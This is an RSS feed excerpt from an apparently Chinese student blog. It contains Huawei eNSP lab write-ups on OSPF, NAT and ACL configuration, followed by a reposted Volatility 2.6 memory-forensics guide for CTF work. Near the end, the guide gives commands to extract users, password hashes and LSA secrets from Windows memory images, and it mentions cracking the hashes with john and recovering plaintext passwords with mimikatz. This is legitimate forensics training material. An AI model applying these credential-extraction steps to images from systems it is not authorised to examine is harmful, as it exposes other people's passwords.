&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[FW2]ospf 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-ospf-1]area 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-ospf-1-area-0.0.0.0]network 10.18.12.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-ospf-1-area-0.0.0.0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-ospf-1]area 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-ospf-1-area-0.0.0.1]network 10.18.2.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-ospf-1-area-0.0.0.1]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[FW2-ospf-1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后进行测试，结果为pc1可以ping通pc2，但是pc2无法ping通pc1&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/</guid>
            <title>网基实践题-NAT</title>
            <link>https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/</link>
            <category>原创</category>
            <category>网基</category>
            <category>eNSP</category>
            <pubDate>Tue, 09 Apr 2024 22:56:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网基实践题-NAT&#34;&gt;&lt;a href=&#34;#网基实践题-NAT&#34; class=&#34;headerlink&#34; title=&#34;网基实践题-NAT&#34;&gt;&lt;/a&gt;网基实践题-NAT&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://so.csdn.net/so/search?q=ensp&amp;spm=1001.2101.3001.7020&#34;&gt;ensp&lt;/a&gt;中NAT种类的分类&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;作用&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;static NAT （静态NAT）&lt;/td&gt;
&lt;td&gt;一个私网地址只能够对应一个公网IP地址&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;easy IP （动态NAT）&lt;/td&gt;
&lt;td&gt;多个私网地址对应一个公网地址&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NAT Server&lt;/td&gt;
&lt;td&gt;外网客户端访问内网服务器时就会用到这个&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;私网IP地址的范围&lt;/p&gt;
&lt;figure class=&#34;highlight handlebars&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;A类地址:10.0.0.0～10.255.255.255 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;B类地址:172.16.0.0 ～172.31.255.255 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-xml&#34;&gt;C类地址:192.168.0.0～192.168.255.255&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;实验拓扑图：&#34;&gt;&lt;a href=&#34;#实验拓扑图：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图：&#34;&gt;&lt;/a&gt;实验拓扑图：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-NAT/image-20240409215941199.png&#34; alt=&#34;image-20240409215941199&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;实验过程：&#34;&gt;&lt;a href=&#34;#实验过程：&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先按照上图将PC机以及相关的路由器各个端口进行配置&lt;/p&gt;
&lt;p&gt;AR1配置如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;Huawei&amp;gt;sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Huawei]sysname AR1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1]int g0/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/0]ip address 7.7.7.7 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/0]quit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1]int g0/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/1]ip address 192.168.1.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/1]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;AR2配置如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;Huawei&amp;gt;sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[Huawei]sysname AR2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR2]int g0/0/0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR2-GigabitEthernet0/0/0]ip address 7.7.7.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR2-GigabitEthernet0/0/0]int g0/0/1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR2-GigabitEthernet0/0/1]ip address 8.8.8.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR2-GigabitEthernet0/0/1]int g0/0/2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR2-GigabitEthernet0/0/2]ip address 9.9.9.1 24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR2-GigabitEthernet0/0/2]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;2.然后AR1需要配置缺省路由，又叫默认路由（比较特殊的静态路由）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[AR1]ip route-static 0.0.0.0 0.0.0.0 7.7.7.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;3.然后配置规则，配置nat&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[AR1]acl number 2000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-acl-basic-2000]rule 5 permit source 192.168.1.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-acl-basic-2000]quit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/0]nat server protocol tcp global current-interface 80 inside 192.168.1.200 80	#这个配置的是NAT Server，将内网服务器192.168.1.200的80端口映射到当前端口公有地址7.7.7.7的80端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/0]nat static global 7.7.7.0 inside 192.168.1.0	#这一行命令和上面的二选一就行，这个是配置静态NAT的，还需要命令nat static enable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/0]nat outbound 2000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;然后就可以发现内网的pc1和pc2是可以ping通外网的外网的却无法ping内网&lt;/p&gt;
&lt;p&gt;具体命令解析：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nat static global 7.7.7.2 inside 192.168.1.100 &lt;/code&gt;     将内网IP地址为192.168.1.100的主机访问外网时，交给公网IP地址7.7.7.2去处理（注：这个公网IP地址是自己指定的）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nat server protocol tcp global current-interface 80 inside 192.168.1.200 80&lt;/code&gt; 的具体解析如下：&lt;/p&gt;
&lt;p&gt;protocol tcp: 这表示NAT服务器将使用TCP协议进行流量转发。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;global current-interface 80: 这部分配置定义了全局地址和端口号。&lt;ul&gt;
&lt;li&gt;global: 表示这是一个全局地址，即用于外部网络访问的地址。&lt;/li&gt;
&lt;li&gt;current-interface: 表示使用当前接口（通常是连接到外部网络的接口）的IP地址作为全局地址。这通常用于动态获取接口的公网IP地址。&lt;/li&gt;
&lt;li&gt;80: 这是外部网络访问内部服务器时所使用的端口号。在这里，它设置为HTTP服务的标准端口号80。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;inside 192.168.1.200 80: 这部分配置定义了内部服务器的地址和端口号。&lt;ul&gt;
&lt;li&gt;inside: 表示这是一个内部地址，即内部网络中服务器的地址。&lt;/li&gt;
&lt;li&gt;192.168.1.200: 这是内部服务器的IP地址。&lt;/li&gt;
&lt;li&gt;80: 这是内部服务器上运行的服务所监听的端口号。在这里，它同样设置为80，表示内部服务器正在监听HTTP服务。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;综上所述，这条命令的作用是配置一个NAT服务器映射，使得外部网络可以通过当前接口的公网IP地址的80端口访问内部网络中IP地址为192.168.1.200的服务器的80端口（通常是HTTP服务）。&lt;/p&gt;
&lt;p&gt;在配置NAT服务器之前，请确保：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;内部服务器已经启动并且服务（在这里是HTTP服务）正在监听指定的端口。&lt;/li&gt;
&lt;li&gt;设备的外部接口已经配置并获得了有效的公网IP地址。&lt;/li&gt;
&lt;li&gt;设备的路由配置允许外部流量到达NAT服务器映射。&lt;/li&gt;
&lt;li&gt;防火墙规则允许相关的TCP流量通过。&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/</guid>
            <title>网基实践题-ACL</title>
            <link>https://w-sqrt7.github.io/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/</link>
            <category>原创</category>
            <category>网基</category>
            <category>eNSP</category>
            <pubDate>Tue, 09 Apr 2024 21:47:03 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;ACL的分类&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;基本ACL（2000-2999）&lt;/th&gt;
&lt;th&gt;根据源地址来进行访问控制&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;高级ACL（3000-3999）&lt;/td&gt;
&lt;td&gt;可以根据源地址、目标地址、源端口号等来进行访问控制&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;注：我们在不管在配置什么ACL的时候，需先保证全网互通，然后在根据需要来进行设置ACL访问控制&lt;/p&gt;
&lt;h1 id=&#34;网基实践题-ACL&#34;&gt;&lt;a href=&#34;#网基实践题-ACL&#34; class=&#34;headerlink&#34; title=&#34;网基实践题-ACL&#34;&gt;&lt;/a&gt;网基实践题-ACL&lt;/h1&gt;&lt;h2 id=&#34;实验拓扑图：&#34;&gt;&lt;a href=&#34;#实验拓扑图：&#34; class=&#34;headerlink&#34; title=&#34;实验拓扑图：&#34;&gt;&lt;/a&gt;实验拓扑图：&lt;/h2&gt;&lt;img src=&#34;/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409211406928.png&#34; alt=&#34;image-20240409211406928&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;h2 id=&#34;实验过程：&#34;&gt;&lt;a href=&#34;#实验过程：&#34; class=&#34;headerlink&#34; title=&#34;实验过程：&#34;&gt;&lt;/a&gt;实验过程：&lt;/h2&gt;&lt;p&gt;1.首先保证PC1和PC2能够互通（具体的就不写了，基本的）&lt;/p&gt;
&lt;img src=&#34;/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409211921518.png&#34; alt=&#34;image-20240409211921518&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;2.配置访问控制列表&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[AR1]acl number 2000 [match-order auto|config] #这里我是设置的auto&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-acl-basic-2000]rule deny source 1.1.1.10 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-acl-basic-2000]rule permit source 1.1.1.0 0.0.0.255 #实际上这个规则是不起作用的，只是方便理解什么是‘深度优先’。上面的设置如果不是auto而是config的话，要加上id号，即rule id [deny|permit]......&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-acl-basic-2000]display this	#这一步也可以忽略，这里只是列出来方便理解&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#acl number 2000  match-order auto&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# rule 5 deny source 1.1.1.10 0 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# rule 10 permit source 1.1.1.0 0.0.0.255&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-acl-basic-2000]int g0/0/0	#进入端口，引用规则&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[AR1-GigabitEthernet0/0/0]traffic-filter inbound acl 2000&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;配置完成之后可以发现PC1的流量没法出去了&lt;/p&gt;
&lt;img src=&#34;/2024/04/09/eNSP/%E7%BD%91%E5%9F%BA%E5%AE%9E%E8%B7%B5%E9%A2%98-ACL/image-20240409214259683.png&#34; alt=&#34;image-20240409214259683&#34; style=&#34;zoom:50%;&#34;&gt;





&lt;p&gt;具体解析：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;match-order auto&lt;/code&gt;：这个参数设置ACL规则的匹配顺序为自动。当设置为“自动”时，系统将按照“深度优先”的顺序自动对规则进行排序。如果“深度优先”的顺序相同，则按照rule-id由小到大的顺序进行匹配。&lt;/p&gt;
&lt;p&gt;当您在创建ACL时指定 &lt;code&gt;match-order config&lt;/code&gt;，这意味着ACL规则将按照您在配置中指定的顺序进行匹配。这意味着规则的顺序对于过滤决策至关重要，因为系统会根据规则在配置中出现的顺序来依次评估它们。&lt;/p&gt;
&lt;p&gt;需要注意的是，如果在创建ACL时没有明确指定 &lt;code&gt;match-order&lt;/code&gt; 参数，那么默认的规则匹配顺序通常是 &lt;code&gt;config&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ACL的inbound和outbound有什么区别：&lt;/p&gt;
&lt;p&gt;inbound和outbound的主要区别在于它们处理网络流量的方向不同。&lt;/p&gt;
&lt;p&gt;Inbound（入站）是指从外部网络（例如Internet）进入本地网络中的数据流量。这种方向的ACL规则主要用于保护内部网络资源免受未经授权的访问和攻击。&lt;/p&gt;
&lt;p&gt;Outbound（出站）则是指从本地网络向外部网络发送的数据流量。这种方向的ACL规则主要用于控制内部网络向外部发送的数据，以防止敏感信息的泄露或不合规的外部访问。&lt;/p&gt;
&lt;p&gt;Inbound方向更侧重于保护内部网络资源，而outbound方向则更侧重于控制内部网络向外部的流量。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/03/25/tools/Volatility2.6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</guid>
            <title>Volatility2.6的使用方法</title>
            <link>https://w-sqrt7.github.io/2024/03/25/tools/Volatility2.6%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</link>
            <category>转载</category>
            <category>工具</category>
            <pubDate>Mon, 25 Mar 2024 16:54:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;Volatility2-6的使用方法&#34;&gt;&lt;a href=&#34;#Volatility2-6的使用方法&#34; class=&#34;headerlink&#34; title=&#34;Volatility2.6的使用方法&#34;&gt;&lt;/a&gt;Volatility2.6的使用方法&lt;/h1&gt;&lt;p&gt;原文链接：&lt;a href=&#34;https://wiki.wgpsec.org/knowledge/ctf/Volatility.html&#34;&gt;https://wiki.wgpsec.org/knowledge/ctf/Volatility.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原文链接：&lt;a href=&#34;https://blog.csdn.net/m0_68012373/article/details/127419463&#34;&gt;https://blog.csdn.net/m0_68012373/article/details/127419463&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;命令格式&#34;&gt;&lt;a href=&#34;#命令格式&#34; class=&#34;headerlink&#34; title=&#34;命令格式&#34;&gt;&lt;/a&gt;命令格式&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f [image] --profile=[profile] [plugin]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;volatility -f [对象] --profile=[操作系统] [插件参数]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;在分析之前，需要先判断当前的镜像信息，分析出是哪个操作系统，命令imageinfo即可获取镜像信息。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Volatility -f xxx.vmem imageinfo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在查到操作系统后如果不确定可以使用以下命令查看&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility - f xxx.vmem --profile= [操作系统] volshell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;常用命令&#34;&gt;&lt;a href=&#34;#常用命令&#34; class=&#34;headerlink&#34; title=&#34;常用命令&#34;&gt;&lt;/a&gt;常用命令&lt;/h2&gt;&lt;p&gt;输入&lt;strong&gt;vol.py –info&lt;/strong&gt;可查看插件&lt;/p&gt;
&lt;p&gt;1.查看当前内存镜像中的用户	printkey -K “SAM\Domains\Account\Users\Names”&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem –profile=Win7SP1x64 printkey -K “SAM\Domains\Account\Users\Names”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;2.查看用户名密码信息(密码是哈希值，需要john爆破)	 hashdump&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 hashdump&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;查看当前操作系统中的 password hash，例如 Windows 的 SAM 文件内容(mimikatz插件可以获取系统明文密码)&lt;/p&gt;
&lt;p&gt;3.如果john爆破不出来，就使用 lasdmp 查看强密码	 lsadmp&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 lsadump&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;4.查看进程	pslist&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 pslist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;pslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以&lt;/p&gt;
&lt;p&gt;5.查看已知进程	pslist&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;volatility -f 1.vmem --profile=Win7SP1x64 pslist -p 2588&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



